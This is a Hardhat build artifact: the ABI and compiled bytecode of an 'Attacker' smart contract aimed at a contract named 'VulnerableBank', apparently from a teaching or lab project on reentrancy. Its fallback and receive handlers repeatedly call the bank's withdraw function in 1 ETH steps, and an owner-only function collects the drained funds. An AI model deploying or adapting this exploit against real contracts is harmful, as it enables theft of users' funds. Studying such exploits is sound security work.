{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attacker",
  "sourceName": "contracts/Attacker.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_vulnerableBankAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "ATTACK_AMOUNT",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attackCount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "vulnerableBank",
      "outputs": [
        {
          "internalType": "contract VulnerableBank",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdrawFunds",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161050938038061050983398101604081905261002f9161005d565b600080546001600160a01b039092166001600160a01b0319928316179055600180549091163317905561008d565b60006020828403121561006f57600080fd5b81516001600160a01b038116811461008657600080fd5b9392505050565b61046d8061009c6000396000f3fe6080604052600436106100745760003560e01c806389ea43e41161004e57806389ea43e4146101ca5780638da5cb5b146101e65780639e5faafc1461021e578063a1c9aee11461022657610113565b806312065fe01461017d57806324600fc31461019f578063407c2821146101b457610113565b36610113576002805490600061008983610410565b90915550506000546001600160a01b031631670de0b6b3a7640000811061011157600054604051632e1a7d4d60e01b8152670de0b6b3a764000060048201526001600160a01b0390911690632e1a7d4d906024015b600060405180830381600087803b1580156100f857600080fd5b505af115801561010c573d6000803e3d6000fd5b505050505b005b600054670de0b6b3a76400006001600160a01b039091163110610111576002805490600061014083610410565b9091555050600054604051632e1a7d4d60e01b8152670de0b6b3a764000060048201526001600160a01b0390911690632e1a7d4d906024016100de565b34801561018957600080fd5b50475b6040519081526020015b60405180910390f35b3480156101ab57600080fd5b50610111610246565b3480156101c057600080fd5b5061018c60025481565b3480156101d657600080fd5b5061018c670de0b6b3a764000081565b3480156101f257600080fd5b50600154610206906001600160a01b031681565b6040516001600160a01b039091168152602001610196565b6101116102e1565b34801561023257600080fd5b50600054610206906001600160a01b031681565b6001546001600160a01b031633146102a55760405162461bcd60e51b815260206004820152601760248201527f4f6e6c79206f776e65722063616e20776974686472617700000000000000000060448201526064015b60405180910390fd5b6001546040516001600160a01b03909116904780156108fc02916000818181858888f193505050501580156102de573d6000803e3d6000fd5b50565b670de0b6b3a76400003410156103395760405162461bcd60e51b815260206004820152601d60248201527f4e656564206174206c6561737420312045544820746f2061747461636b000000604482015260640161029c565b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561038f57600080fd5b505af11580156103a3573d6000803e3d6000fd5b5050600054604051632e1a7d4d60e01b8152670de0b6b3a764000060048201526001600160a01b039091169350632e1a7d4d92506024019050600060405180830381600087803b1580156103f657600080fd5b505af115801561040a573d6000803e3d6000fd5b50505050565b60006001820161043057634e487b7160e01b600052601160045260246000fd5b506001019056fea264697066735822122032b6459aa4d57dc5e920de2c04239769197548595816ae91894e75d75c1083a064736f6c63430008140033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}